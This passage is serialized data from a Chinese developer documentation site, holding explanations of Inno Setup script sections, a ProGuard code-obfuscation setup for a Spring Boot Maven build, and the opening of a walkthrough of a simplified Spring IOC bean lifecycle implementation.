部分中，你可以指定各种安装程序的属性，例如应用程序名称、版本号、安装目录、输出目录等。以下是 [setup] 可以描述的一些重要内容：\n\n * appname：这个选项用于指定安装程序的应用程序名称。它将在安装过程中显示给用户，通常用于在开始菜单、卸载项等位置显示应用程序的名称。\n * appversion：用于定义安装程序的版本号。这可以是你的应用程序的实际版本号，以帮助用户了解安装的内容。\n * defaultdirname：指定默认的安装目录。可以使用预定义的常量（如 {pf} 代表 program files 目录），或者指定一个具体的路径。\n * outputdir：定义生成安装程序的输出目录。这是指定生成的安装文件（通常是 .exe 文件）将被保存的位置。\n * outputbasefilename：指定生成的安装程序的文件名，通常是一个 .exe 文件。这将是用户运行的实际安装程序文件的名称。\n * apppublisher：用于指定应用程序的发布者或公司名称，它将在安装过程中显示。\n * apppublisherurl：可用于提供应用程序发布者的网站或 url，这也将在安装过程中显示。\n * appsupporturl：可以包含支持或帮助信息的 url。\n * appupdatesurl：如果有关于应用程序更新的信息或 url，可以在这里指定。\n * appmutex：用于指定应用程序的互斥体名称，以确保在安装过程中只能运行一个实例。\n * defaultgroupname：定义开始菜单中应用程序快捷方式的默认组名。\n * allowuncpath：指定是否允许安装到 unc 路径（网络共享路径）。\n * uninstalldisplayicon：定义卸载程序的显示图标。\n * uninstalldisplayname：指定卸载程序的显示名称。\n * uninstallstring：定义卸载程序的执行命令。\n\n\n# dirs\n\n用于定义在用户计算机上创建的目录结构。通过 [dirs] 部分，你可以指定要在目标计算机上创建的目录，以便在安装过程中将文件复制到这些目录中。以下是 [dirs] 可以描述的内容：\n\n 1. 目录名称：在 [dirs] 部分中，你可以列出要创建的目录的名称。这些目录名称通常是相对于安装目录（由 [setup] 部分的 defaultdirname 指定）的相对路径。\n 2. permissions：你可以为每个目录指定权限，例如读、写、执行权限。这允许你控制用户是否可以访问或修改这些目录中的文件。\n 3. subdirectories：你可以定义子目录，以便在目录创建时同时创建子目录。这有助于构建复杂的目录结构\n\n\n# files\n\n用于指定要在安装过程中包含的文件和它们的安装目标。通过 [files] 部分，你可以定义要复制到目标计算机上的文件、文件的源路径和文件的目标路径，以及其他文件相关的属性。以下是 [files] 可以描述的内容：\n\n * source：这个字段指定了要复制的文件的源路径。你可以指定完整的文件路径，也可以使用通配符来包括多个文件。\n * destdir：用于指定文件的目标目录。这是文件在用户计算机上的最终安装位置。\n * destname：指定文件在目标计算机上的名称。这可以是与源文件不同的名称。\n * check：这个字段允许你定义文件的检查方法，以确保文件在复制到目标计算机上时没有被更改或损坏。\n * permissions：你可以为每个文件定义权限，包括文件的读、写、执行权限。这允许你控制用户对文件的访问权限。\n * attribs：允许你为文件定义属性，如只读、隐藏等。\n * fontinstall：如果你的安装程序包含字体文件，你可以使用这个字段来安装字体文件并注册它们。\n * flags：用于指定与文件相关的特定标志，例如创建快捷方式。\n\n\n# registry\n\n用于在 windows 注册表中创建、修改或删除键和值。通过 [registry] 部分，你可以配置你的安装程序在用户计算机上创建注册表项，以存储应用程序的配置信息、关联文件扩展、文件关联等等。以下是 [registry] 可以描述的内容：\n\n * root：指定注册表项的根键，通常是 hkey_local_machine 或 hkey_current_user。不同的根键对应不同的部分，例如 hkey_local_machine 用于系统范围的设置，而 hkey_current_user 用于当前用户的设置。\n * subkey：指定注册表项的子键路径。这是注册表中的目标位置。\n * valuename：定义注册表值的名称。这可以是一个字符串，通常用于存储应用程序的配置信息。\n * valuetype：指定注册表值的类型，如字符串、整数等。\n * valuedata：定义注册表值的数据。这是实际的值，可以是文本、数字等。\n * flags：用于指定注册表项和值的属性，例如创建、删除、覆盖等。\n * permissions：你可以定义注册表项的权限，以确保只有具有适当权限的用户才能访问或修改注册表项。\n\n\n# run\n\n用于在安装过程中指定要运行的可执行文件、脚本或其他程序。通过 [run] 部分，你可以配置安装程序在安装完成后或卸载程序时执行的操作。以下是 [run] 可以描述的内容：\n\n * filename：指定要运行的文件的路径，这可以是一个可执行文件（.exe）、脚本（.bat、.cmd、.vbs 等）或其他程序。\n * parameters：定义要传递给运行文件的参数或命令行参数。这允许你向运行的程序传递额外的信息。\n * workingdir：指定运行文件时的工作目录。这是运行文件所在的目录。\n * description：提供一个可选的描述，以便在安装过程中显示或记录此操作。\n * flags：用于指定运行操作的标志，例如是否等待运行的程序完成。\n * statusmsg：定义在执行此操作时要显示给用户的状态消息。',charsets:{cjk:!0}},{title:"java代码混淆之 ProGuard",frontmatter:{title:"java代码混淆之 ProGuard",date:"2023-06-25T09:22:36.000Z",permalink:"/java/102/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/10.java/102.java%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E4%B9%8BProGuard.html",relativePath:"00.java/10.java/102.java代码混淆之ProGuard.md",key:"v-2acc2292",path:"/java/102/",headers:[{level:2,title:"添加依赖",slug:"添加依赖",normalizedTitle:"添加依赖",charIndex:218},{level:2,title:"配置ProGuard",slug:"配置proguard",normalizedTitle:"配置 proguard",charIndex:2643}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"添加依赖 配置ProGuard",content:"ProGuard 是一个用于 Java 应用程序的代码混淆和优化工具，通常用于 Android 应用程序，但同样适用于 Spring Boot 应用程序。混淆代码可以增强安全性，并减小应用程序的体积。使用 proguard 混淆代码只能增加阅读和理解的难度，并不能百分百保证代码安全。也即是达到让开发人员看到这头痛的代码有 99.99999% 的冲动放弃阅读，拍桌子说还不如我重写一遍逻辑。但是如果一些重要的静态数据依然会暴漏\n\n\n# 添加依赖\n\n首先，你需要在项目的构建文件（通常是 build.gradle 或 pom.xml）中添加 ProGuard 的依赖。\n\n\x3c!-- 混淆 --\x3e\n<plugin>\n  <groupId>com.github.wvengen</groupId>\n  <artifactId>proguard-maven-plugin</artifactId>\n  <version>2.6.0</version>\n  <executions>\n    \x3c!-- 以下配置说明执行mvn的package命令时候，会执行proguard--\x3e\n    <execution>\n      <phase>package</phase>\n      <goals>\n        <goal>proguard</goal>\n      </goals>\n    </execution>\n  </executions>\n  <configuration>\n    \x3c!--  CreateProcess error=206, 文件名或扩展名太长 --\x3e\n    <putLibraryJarsInTempDir>true</putLibraryJarsInTempDir>\n    \x3c!-- 就是输入Jar的名称，我们要知道，代码混淆其实是将一个原始的jar，生成一个混淆后的jar，那么就会有输入输出。 --\x3e\n    <injar>${project.build.finalName}.jar</injar>\n    \x3c!-- 输出jar名称，输入输出jar同名的时候就是覆盖，也是比较常用的配置。 --\x3e\n    <outjar>${project.build.finalName}.jar</outjar>\n    \x3c!-- 是否混淆 默认是true --\x3e\n    <obfuscate>true</obfuscate>\n    \x3c!-- 配置一个文件，通常叫做proguard.cfg,该文件主要是配置options选项，也就是说使用proguard.cfg那么options下的所有内容都可以移到proguard.cfg中 --\x3e\n    <proguardInclude>${project.basedir}/proguard.cfg</proguardInclude>\n    \x3c!-- 额外的jar包，通常是项目编译所需要的jar --\x3e\n    <libs>\n      <lib>${java.home}/lib/rt.jar</lib>\n      <lib>${java.home}/lib/jce.jar</lib>\n      <lib>${java.home}/lib/jsse.jar</lib>\n    </libs>\n    \x3c!-- 对输入jar进行过滤比如，如下配置就是对META-INFO文件不处理。 --\x3e\n    <inLibsFilter>!META-INF/**,!META-INF/versions/9/**.class</inLibsFilter>\n    \x3c!-- 这是输出路径配置，但是要注意这个路径必须要包括injar标签填写的jar --\x3e\n    <outputDirectory>${project.basedir}/target</outputDirectory>\n    \x3c!--这里特别重要，此处主要是配置混淆的一些细节选项，比如哪些类不需要混淆，哪些需要混淆--\x3e\n    <options>\n      \x3c!-- 可以在此处写option标签配置，不过我上面使用了proguardInclude，故而我更喜欢在proguard.cfg中配置 --\x3e\n    </options>\n  </configuration>\n</plugin>\n\x3c!-- spring,注意一定要放在混淆插件之后 --\x3e\n<plugin>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-maven-plugin</artifactId>\n  <configuration>\n    <excludes>\n      <exclude>\n        <groupId>org.projectlombok</groupId>\n        <artifactId>lombok</artifactId>\n      </exclude>\n    </excludes>\n  </configuration>\n  <executions>\n    <execution>\n      \x3c!-- spingboot 打包需要repackage否则不是可执行jar --\x3e\n      <goals>\n        <goal>repackage</goal>\n      </goals>\n      <configuration>\n        <mainClass>com.aizuda.easyManagerTool.ToolBootApplication</mainClass>\n      </configuration>\n    </execution>\n  </executions>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n\n# 配置 ProGuard\n\n#指定Java的版本\n-target 1.8\n#proguard会对代码进行优化压缩，他会删除从未使用的类或者类成员变量等\n-dontshrink\n#是否关闭字节码级别的优化，如果不开启则设置如下配置\n-dontoptimize\n#混淆时不生成大小写混合的类名，默认是可以大小写混合\n-dontusemixedcaseclassnames\n# 对于类成员的命名的混淆采取唯一策略\n-useuniqueclassmembernames\n#混淆时不生成大小写混合的类名，默认是可以大小写混合\n-dontusemixedcaseclassnames\n#混淆类名之后，对使用Class.forName('className')之类的地方进行相应替代\n-adaptclassstrings\n\n#对异常、注解信息予以保留\n-keepattributes Exceptions,InnerClasses,Signature,Deprecated,SourceFile,LineNumberTable,*Annotation*,EnclosingMethod\n# 此选项将保存接口中的所有原始名称（不混淆）--\x3e\n#-keepnames interface ** { *; }\n# 此选项将保存所有软件包中的所有原始接口文件（不进行混淆）\n#-keep interface * extends * { *; }\n#保留参数名，因为控制器，或者Mybatis等接口的参数如果混淆会导致无法接受参数，xml文件找不到参数\n-keepparameternames\n# 保留枚举成员及方法\n-keepclassmembers enum * { *; }\n# 不混淆所有类,保存原始定义的注释-\n-keepclassmembers class * {\n    @org.springframework.context.annotation.Bean *;\n    @org.springframework.beans.factory.annotation.Autowired *;\n    @org.springframework.beans.factory.annotation.Value *;\n    @org.springframework.stereotype.Service *;\n    @org.springframework.stereotype.Component *;\n}\n\n#忽略warn消息\n-ignorewarnings\n#忽略note消息\n-dontnote\n#打印配置信息\n-printconfiguration\n-keep public class com.aizuda.easyManagerTool.ToolBootApplication {\n        public static void main(java.lang.String[]);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n",normalizedContent:"proguard 是一个用于 java 应用程序的代码混淆和优化工具，通常用于 android 应用程序，但同样适用于 spring boot 应用程序。混淆代码可以增强安全性，并减小应用程序的体积。使用 proguard 混淆代码只能增加阅读和理解的难度，并不能百分百保证代码安全。也即是达到让开发人员看到这头痛的代码有 99.99999% 的冲动放弃阅读，拍桌子说还不如我重写一遍逻辑。但是如果一些重要的静态数据依然会暴漏\n\n\n# 添加依赖\n\n首先，你需要在项目的构建文件（通常是 build.gradle 或 pom.xml）中添加 proguard 的依赖。\n\n\x3c!-- 混淆 --\x3e\n<plugin>\n  <groupid>com.github.wvengen</groupid>\n  <artifactid>proguard-maven-plugin</artifactid>\n  <version>2.6.0</version>\n  <executions>\n    \x3c!-- 以下配置说明执行mvn的package命令时候，会执行proguard--\x3e\n    <execution>\n      <phase>package</phase>\n      <goals>\n        <goal>proguard</goal>\n      </goals>\n    </execution>\n  </executions>\n  <configuration>\n    \x3c!--  createprocess error=206, 文件名或扩展名太长 --\x3e\n    <putlibraryjarsintempdir>true</putlibraryjarsintempdir>\n    \x3c!-- 就是输入jar的名称，我们要知道，代码混淆其实是将一个原始的jar，生成一个混淆后的jar，那么就会有输入输出。 --\x3e\n    <injar>${project.build.finalname}.jar</injar>\n    \x3c!-- 输出jar名称，输入输出jar同名的时候就是覆盖，也是比较常用的配置。 --\x3e\n    <outjar>${project.build.finalname}.jar</outjar>\n    \x3c!-- 是否混淆 默认是true --\x3e\n    <obfuscate>true</obfuscate>\n    \x3c!-- 配置一个文件，通常叫做proguard.cfg,该文件主要是配置options选项，也就是说使用proguard.cfg那么options下的所有内容都可以移到proguard.cfg中 --\x3e\n    <proguardinclude>${project.basedir}/proguard.cfg</proguardinclude>\n    \x3c!-- 额外的jar包，通常是项目编译所需要的jar --\x3e\n    <libs>\n      <lib>${java.home}/lib/rt.jar</lib>\n      <lib>${java.home}/lib/jce.jar</lib>\n      <lib>${java.home}/lib/jsse.jar</lib>\n    </libs>\n    \x3c!-- 对输入jar进行过滤比如，如下配置就是对meta-info文件不处理。 --\x3e\n    <inlibsfilter>!meta-inf/**,!meta-inf/versions/9/**.class</inlibsfilter>\n    \x3c!-- 这是输出路径配置，但是要注意这个路径必须要包括injar标签填写的jar --\x3e\n    <outputdirectory>${project.basedir}/target</outputdirectory>\n    \x3c!--这里特别重要，此处主要是配置混淆的一些细节选项，比如哪些类不需要混淆，哪些需要混淆--\x3e\n    <options>\n      \x3c!-- 可以在此处写option标签配置，不过我上面使用了proguardinclude，故而我更喜欢在proguard.cfg中配置 --\x3e\n    </options>\n  </configuration>\n</plugin>\n\x3c!-- spring,注意一定要放在混淆插件之后 --\x3e\n<plugin>\n  <groupid>org.springframework.boot</groupid>\n  <artifactid>spring-boot-maven-plugin</artifactid>\n  <configuration>\n    <excludes>\n      <exclude>\n        <groupid>org.projectlombok</groupid>\n        <artifactid>lombok</artifactid>\n      </exclude>\n    </excludes>\n  </configuration>\n  <executions>\n    <execution>\n      \x3c!-- spingboot 打包需要repackage否则不是可执行jar --\x3e\n      <goals>\n        <goal>repackage</goal>\n      </goals>\n      <configuration>\n        <mainclass>com.aizuda.easymanagertool.toolbootapplication</mainclass>\n      </configuration>\n    </execution>\n  </executions>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n\n# 配置 proguard\n\n#指定java的版本\n-target 1.8\n#proguard会对代码进行优化压缩，他会删除从未使用的类或者类成员变量等\n-dontshrink\n#是否关闭字节码级别的优化，如果不开启则设置如下配置\n-dontoptimize\n#混淆时不生成大小写混合的类名，默认是可以大小写混合\n-dontusemixedcaseclassnames\n# 对于类成员的命名的混淆采取唯一策略\n-useuniqueclassmembernames\n#混淆时不生成大小写混合的类名，默认是可以大小写混合\n-dontusemixedcaseclassnames\n#混淆类名之后，对使用class.forname('classname')之类的地方进行相应替代\n-adaptclassstrings\n\n#对异常、注解信息予以保留\n-keepattributes exceptions,innerclasses,signature,deprecated,sourcefile,linenumbertable,*annotation*,enclosingmethod\n# 此选项将保存接口中的所有原始名称（不混淆）--\x3e\n#-keepnames interface ** { *; }\n# 此选项将保存所有软件包中的所有原始接口文件（不进行混淆）\n#-keep interface * extends * { *; }\n#保留参数名，因为控制器，或者mybatis等接口的参数如果混淆会导致无法接受参数，xml文件找不到参数\n-keepparameternames\n# 保留枚举成员及方法\n-keepclassmembers enum * { *; }\n# 不混淆所有类,保存原始定义的注释-\n-keepclassmembers class * {\n    @org.springframework.context.annotation.bean *;\n    @org.springframework.beans.factory.annotation.autowired *;\n    @org.springframework.beans.factory.annotation.value *;\n    @org.springframework.stereotype.service *;\n    @org.springframework.stereotype.component *;\n}\n\n#忽略warn消息\n-ignorewarnings\n#忽略note消息\n-dontnote\n#打印配置信息\n-printconfiguration\n-keep public class com.aizuda.easymanagertool.toolbootapplication {\n        public static void main(java.lang.string[]);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n",charsets:{cjk:!0}},{title:"核心内容拆解 IOC",frontmatter:{title:"核心内容拆解 IOC",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/200/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/21.spring/200.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20IOC.html",relativePath:"00.java/20.Spring/21.spring/200.核心内容拆解 IOC.md",key:"v-5ba1bd3a",path:"/spring/spring/200/",headers:[{level:2,title:"读取XML文件",slug:"读取xml文件",normalizedTitle:"读取 xml 文件",charIndex:266},{level:2,title:"封装 BeanDefinition",slug:"封装-beandefinition",normalizedTitle:"封装 beandefinition",charIndex:1752},{level:2,title:"BeanFactoryPostProcessor",slug:"beanfactorypostprocessor",normalizedTitle:"beanfactorypostprocessor",charIndex:6633},{level:2,title:"注册实现BeanPostProcessor的类",slug:"注册实现beanpostprocessor的类",normalizedTitle:"注册实现 beanpostprocessor 的类",charIndex:8907},{level:2,title:"实例化Bean",slug:"实例化bean",normalizedTitle:"实例化 bean",charIndex:9031},{level:2,title:"注解属性填充",slug:"注解属性填充",normalizedTitle:"注解属性填充",charIndex:233},{level:2,title:"XML属性填充",slug:"xml属性填充",normalizedTitle:"xml 属性填充",charIndex:244},{level:2,title:"感知对象",slug:"感知对象",normalizedTitle:"感知对象",charIndex:18936},{level:2,title:"初始化方法之前",slug:"初始化方法之前",normalizedTitle:"初始化方法之前",charIndex:20221},{level:2,title:"Bean的初始化方法",slug:"bean的初始化方法",normalizedTitle:"bean 的初始化方法",charIndex:11230},{level:2,title:"初始化方法之后",slug:"初始化方法之后",normalizedTitle:"初始化方法之后",charIndex:22301},{level:2,title:"注册销毁事件",slug:"注册销毁事件",normalizedTitle:"注册销毁事件",charIndex:22789},{level:2,title:"scop处理单例",slug:"scop处理单例",normalizedTitle:"scop 处理单例",charIndex:25471}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"读取XML文件 封装 BeanDefinition BeanFactoryPostProcessor 注册实现BeanPostProcessor的类 实例化Bean 注解属性填充 XML属性填充 感知对象 初始化方法之前 Bean的初始化方法 初始化方法之后 注册销毁事件 scop处理单例",content:'Spring 是 JAVA 开发用到最多的一个 WEB 框架，核心是 IOC（控制反转）和 AOP（面向切面），但做为架构，想要对 Spring 要进行扩展等，必须要了解 Spring 的生命周期、事件、AOP、行为感知等。Spring 生命周期如下图：\n\n\n\n提示\n\n本文主要了解 spring 生命周期的有哪些，以及他们的核心代码是怎么编写，整个过程是偏 IOC 和 DI 的，IOC 将对象的创建和依赖关系的维护从代码中脱离出来，通过配置读取创建对象；DI 从注解属性填充过程以及 XML 属性填充过程为具体的体现。\n\n\n# 读取 XML 文件\n\n通过 ClassPathXmlApplicationContext 来读取资源文件下的 spring.xml\n\n    @Test\n    public void test() {\n        ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext("classpath:spring.xml");\n        UserService userService = applicationContext.getBean("userService", UserService.class);\n        System.out.println("测试结果：" + userService.queryUserInfo());\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n根据文件类型使用不同的方式读取到流中\n\n    @Override\n    public Resource getResource(String location) {\n        Assert.notNull(location, "Location must not be null");\n        if (location.startsWith(CLASSPATH_URL_PREFIX)) {\n            return new ClassPathResource(location.substring(CLASSPATH_URL_PREFIX.length()));\n        }\n        else {\n            try {\n                URL url = new URL(location);\n                return new UrlResource(url);\n            } catch (MalformedURLException e) {\n                return new FileSystemResource(location);\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n调用 XML 解析\n\n    @Override\n    public void loadBeanDefinitions(Resource resource) throws BeansException {\n        try {\n            try (InputStream inputStream = resource.getInputStream()) {\n                doLoadBeanDefinitions(inputStream);\n            }\n        } catch (IOException | ClassNotFoundException | DocumentException e) {\n            throw new BeansException("IOException parsing XML document from " + resource, e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 封装 BeanDefinition\n\n解析 XML 的整个过程：\n\n * 解析 DOM\n * 解析带有 @Component 注解的类，并封装为 BeanDefinition 注册到 BeanFactory\n * 解析不是 component-scan 定义的类\n\n    protected void doLoadBeanDefinitions(InputStream inputStream) throws ClassNotFoundException, DocumentException {\n        // 使用 org.dom4j.io 的解析器\n        SAXReader reader = new SAXReader();\n        Document document = reader.read(inputStream);\n        Element root = document.getRootElement();\n        // 解析 context:component-scan 标签，扫描包中的类并提取相关信息，用于组装 BeanDefinition\n        Element componentScan = root.element("component-scan");\n        if (null != componentScan) {\n            String scanPath = componentScan.attributeValue("base-package");\n            if (StrUtil.isEmpty(scanPath)) {\n                throw new BeansException("The value of base-package attribute can not be empty or null");\n            }\n            // 扫描整个包\n            scanPackage(scanPath);\n        }\n        List<Element> beanList = root.elements("bean");\n        for (Element bean : beanList) {\n            String id = bean.attributeValue("id");\n            String name = bean.attributeValue("name");\n            String className = bean.attributeValue("class");\n            String initMethod = bean.attributeValue("init-method");\n            String destroyMethodName = bean.attributeValue("destroy-method");\n            String beanScope = bean.attributeValue("scope");\n            // 获取 Class，方便获取类中的名称\n            Class<?> clazz = Class.forName(className);\n            // 优先级 id > name\n            String beanName = StrUtil.isNotEmpty(id) ? id : name;\n            if (StrUtil.isEmpty(beanName)) {\n                beanName = StrUtil.lowerFirst(clazz.getSimpleName());\n            }\n            // 定义Bean\n            BeanDefinition beanDefinition = new BeanDefinition(clazz);\n            beanDefinition.setInitMethodName(initMethod);\n            beanDefinition.setDestroyMethodName(destroyMethodName);\n            if (StrUtil.isNotEmpty(beanScope)) {\n                beanDefinition.setScope(beanScope);\n            }\n            List<Element> propertyList = bean.elements("property");\n            // 读取属性并填充\n            for (Element property : propertyList) {\n                // 解析标签：property\n                String attrName = property.attributeValue("name");\n                String attrValue = property.attributeValue("value");\n                String attrRef = property.attributeValue("ref");\n                // 获取属性值：引入对象、值对象\n                Object value = StrUtil.isNotEmpty(attrRef) ? new BeanReference(attrRef) : attrValue;\n                // 创建属性信息\n                PropertyValue propertyValue = new PropertyValue(attrName, value);\n                beanDefinition.getPropertyValues().addPropertyValue(propertyValue);\n            }\n            if (getRegistry().containsBeanDefinition(beanName)) {\n                throw new BeansException("Duplicate beanName[" + beanName + "] is not allowed");\n            }\n            // 注册 BeanDefinition\n            getRegistry().registerBeanDefinition(beanName, beanDefinition);\n        }\n    }\n\n    private void scanPackage(String scanPath) {\n        String[] basePackages = StrUtil.splitToArray(scanPath, \',\');\n        ClassPathBeanDefinitionScanner scanner = new ClassPathBeanDefinitionScanner(getRegistry());\n        scanner.doScan(basePackages);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\n根据提供路径封装为 BeanDefinition 并注册到 BeanFactory\n\n    public void doScan(String... basePackages) {\n        for (String basePackage : basePackages) {\n            Set<BeanDefinition> candidates = findCandidateComponents(basePackage);\n            for (BeanDefinition beanDefinition : candidates) {\n                // 解析 Bean 的作用域 singleton、prototype\n                String beanScope = resolveBeanScope(beanDefinition);\n                if (StrUtil.isNotEmpty(beanScope)) {\n                    beanDefinition.setScope(beanScope);\n                }\n                registry.registerBeanDefinition(determineBeanName(beanDefinition), beanDefinition);\n            }\n        }\n\n        // 注册处理注解的 BeanPostProcessor(@Autowired、@Value)\n        registry.registerBeanDefinition("cn.bugstack.springframework.context.annotation.internalAutowiredAnnotationProcessor", new BeanDefinition(AutowiredAnnotationBeanPostProcessor.class));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n对提供的包路径扫描有 @Component 注解的类\n\n    public Set<BeanDefinition> findCandidateComponents(String basePackage) {\n        Set<BeanDefinition> candidates = new LinkedHashSet<>();\n        Set<Class<?>> classes = ClassUtil.scanPackageByAnnotation(basePackage, Component.class);\n        for (Class<?> clazz : classes) {\n            candidates.add(new BeanDefinition(clazz));\n        }\n        return candidates;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# BeanFactoryPostProcessor\n\nBeanFactoryPostProcessor 可以修改我们对 BeanDefinition 定义的所有信息，可以添加属性，修改属性，添加额外的方法等。具体会对所有实现 BeanFactoryPostProcessor 的类进行获取，并循环调用 postProcessBeanFactory 方法\n\n    private void invokeBeanFactoryPostProcessors(ConfigurableListableBeanFactory beanFactory) {\n        Map<String, BeanFactoryPostProcessor> beanFactoryPostProcessorMap = beanFactory.getBeansOfType(BeanFactoryPostProcessor.class);\n        for (BeanFactoryPostProcessor beanFactoryPostProcessor : beanFactoryPostProcessorMap.values()) {\n            beanFactoryPostProcessor.postProcessBeanFactory(beanFactory);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n提供一个默认的实现\n\n    @Override\n    public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) throws BeansException {\n        try {\n            // 加载属性文件\n            DefaultResourceLoader resourceLoader = new DefaultResourceLoader();\n            Resource resource = resourceLoader.getResource(location);\n\n            // 把属性文件的内容加载到Properties里组成键值对\n            Properties properties = new Properties();\n            properties.load(resource.getInputStream());\n            String[] beanDefinitionNames = beanFactory.getBeanDefinitionNames();\n            for (String beanName : beanDefinitionNames) {\n                BeanDefinition beanDefinition = beanFactory.getBeanDefinition(beanName);\n                PropertyValues propertyValues = beanDefinition.getPropertyValues();\n                for (PropertyValue propertyValue : propertyValues.getPropertyValues()) {\n                    Object value = propertyValue.getValue();\n                    if (!(value instanceof String)) continue;\n                    value = resolvePlaceholder((String) value, properties);\n                    propertyValues.addPropertyValue(new PropertyValue(propertyValue.getName(), value));\n                }\n            }\n            // 向容器中添加字符串解析器，供解析@Value注解使用\n            StringValueResolver valueResolver = new PlaceholderResolvingStringValueResolver(properties);\n            // 注册到容器，以便后续使用\n            beanFactory.addEmbeddedValueResolver(valueResolver);\n        } catch (IOException e) {\n            throw new BeansException("Could not load properties", e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 注册实现 BeanPostProcessor 的类\n\nBeanPostProcessor 就是提供了 postProcessBeforeInitialization，postProcessAfterInitialization 两种方法，提供我们在实例化 Bean 的时候，所有实现 BeanPostProcessor 的类，注册到 List<BeanPostProcessor> beanPostProcessors = new ArrayList<BeanPostProcessor>(); 中\n\n    private void registerBeanPostProcessors(ConfigurableListableBeanFactory beanFactory) {\n        Map<String, BeanPostProcessor> beanPostProcessorMap = beanFactory.getBeansOfType(BeanPostProcessor.class);\n        for (BeanPostProcessor beanPostProcessor : beanPostProcessorMap.values()) {\n            beanFactory.addBeanPostProcessor(beanPostProcessor);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 实例化 Bean\n\n    protected <T> T doGetBean(final String name, final Object[] args) {\n        // 从缓存中获取实例\n        Object sharedInstance = getSingleton(name);\n        if (sharedInstance != null) {\n            // 如果实现了 FactoryBean，则需要调用 FactoryBean##getObject\n            return (T) getObjectForBeanInstance(sharedInstance, name);\n        }\n        // 从BeanDefinition列表中获取对象\n        BeanDefinition beanDefinition = getBeanDefinition(name);\n        Object bean = createBean(name, beanDefinition, args);\n        // 如果实现了 FactoryBean，则需要调用 FactoryBean##getObject\n        return (T) getObjectForBeanInstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n实例化 Bean 的具体方法\n\n    protected Object doCreateBean(String beanName, BeanDefinition beanDefinition, Object[] args) {\n        Object bean = null;\n        try {\n            // 实例化 Bean\n            bean = createBeanInstance(beanDefinition, beanName, args);\n            // 处理循环依赖，将实例化后的Bean对象提前放入缓存中暴露出来\n            if (beanDefinition.isSingleton()) {\n                Object finalBean = bean;\n                addSingletonFactory(beanName, () -> getEarlyBeanReference(beanName, beanDefinition, finalBean));\n            }\n            // 是否需要继续进行后续的属性填充\n            boolean continueWithPropertyPopulation = applyBeanPostProcessorsAfterInstantiation(beanName, bean);\n            if (!continueWithPropertyPopulation) {\n                return bean;\n            }\n            // 在设置 Bean 属性之前，允许 BeanPostProcessor 修改属性值（注解属性填充）\n            applyBeanPostProcessorsBeforeApplyingPropertyValues(beanName, bean, beanDefinition);\n            // 给 Bean 填充属性（xml属性填充）\n            applyPropertyValues(beanName, bean, beanDefinition);\n            // 执行 Bean 的初始化方法和 BeanPostProcessor 的前置和后置处理方法\n            bean = initializeBean(beanName, bean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException("Instantiation of bean failed", e);\n        }\n        // 注册实现了 DisposableBean 接口的 Bean 对象\n        registerDisposableBeanIfNecessary(beanName, bean, beanDefinition);\n        // 判断 SCOPE_SINGLETON、SCOPE_PROTOTYPE\n        Object exposedObject = bean;\n        if (beanDefinition.isSingleton()) {\n            // 获取代理对象\n            exposedObject = getSingleton(beanName);\n            registerSingleton(beanName, exposedObject);\n        }\n        return exposedObject;\n    